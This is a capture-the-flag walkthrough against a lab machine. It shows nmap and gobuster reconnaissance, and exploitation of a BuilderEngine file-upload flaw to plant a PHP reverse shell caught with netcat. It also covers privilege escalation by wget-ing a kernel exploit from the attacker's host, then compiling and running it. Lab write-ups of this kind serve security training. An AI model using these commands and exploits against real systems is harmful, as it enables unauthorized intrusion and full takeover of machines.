* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

![alt text](./img/muts00.PNG?raw=true)  

## Recon-Enumeration  
nmap -A -p- 10.2.0.11  
![alt text](./img/muts01.PNG?raw=true)  
  
![alt text](./img/muts02.PNG?raw=true)  
  
![alt text](./img/muts03.PNG?raw=true)  

enum4linux 10.2.0.11  
![alt text](./img/muts08.PNG?raw=true)  
  
gobuster dir -u http://10.2.0.11 -w ~/wordlists/big.txt -e -x php,html,txt,xml,sql,aspx -t 100  
![alt text](./img/muts04.PNG?raw=true)  
  
![alt text](./img/muts05.PNG?raw=true)  

gobuster dir -u http://10.2.0.11:8080 -w ~/wordlists/big.txt -e -x php,html,txt,xml,sql,aspx -t 100  
![alt text](./img/muts06.PNG?raw=true)  
  
![alt text](./img/muts07.PNG?raw=true)  

## Exploit

On the main page it says BuilderEngine, so let’s see if exists any exploit to it  
searchsploit builderengine  
![alt text](./img/muts11.PNG?raw=true)  

searchsploit -x php/webapps/40390.php  
![alt text](./img/muts12.PNG?raw=true)  

Ok, so we need to use a request, to make the things easier let’s use Burp  
Open BurpSuite  
In your browser accesss http://10.2.0.11/themes/dashboard/assets/plugins/jquery-file-upload/server/php/  
Look the request on Burp and send it to Repeater  
![alt text](./img/muts13.PNG?raw=true)  

Put the exploit code in the request and send it  
![alt text](./img/muts14.PNG?raw=true)  

Now access http://10.2.0.11/files, will appear a file with a strange name  
![alt text](./img/muts15.PNG?raw=true)  

Click on it and will appear an upload page  
![alt text](./img/muts16.PNG?raw=true)  

Here you can upload a php reverse shell, you can use the file in /usr/share/webshells/php/php-reverse-shell.php, just change the $ip and $port to yours.  
After select it click on SEND and return to http://10.2.0.11/files  
![alt text](./img/muts17.PNG?raw=true)  

Start an netcat listener  
nc -nvlp 1234  
Now access the uploaded page  
![alt text](./img/muts18.PNG?raw=true)  
HABEMUS SHELL \o/  

## Privesc

Run the commands above to get a better shell:  
- python -c 'import pty; pty.spawn("/bin/bash")'  
- export TERM=xterm  

cat /etc/passwd  
![alt text](./img/muts19.PNG?raw=true)  

cat /etc/issue  
cat /etc/*-release  
uname -a  
uname -r  
arch  
![alt text](./img/muts20.PNG?raw=true)  

find / -perm -u=s 2>/dev/null  
![alt text](./img/muts21.PNG?raw=true)  

During enumeration we found the user.txt flag on /var folder  
![alt text](./img/muts22.PNG?raw=true)  

Since we have ubuntu versions, let’s try to find an privilege escalation exploit  
searchsploit ubuntu 14 priv  
![alt text](./img/muts23.PNG?raw=true)  

Here we have a lot of exploit, however many are not usefull for this kernel version.  
After a fell tries the one that worked was…  
![alt text](./img/muts24.PNG?raw=true)  

So let’s read it  
searchsploit -x linux/local/36746.c   
![alt text](./img/muts25.PNG?raw=true)    
  
Those are the instructions to compile the code  

Copy it to your computer  
- searchsploit -m linux/local/36746.c  
And send the file to the target machine. I used the above command:  
- sudo python3 -m http.server 80  

On the target machine use this commands:  
- cd /tmp  
- wget http://10.2.0.4/36746.c  
- gcc -static 36746.c  
- ./a.out  
- id  

![alt text](./img/muts26.PNG?raw=true)  

PWNED!  

Now just grab the flag  
![alt text](./img/muts27.PNG?raw=true)  
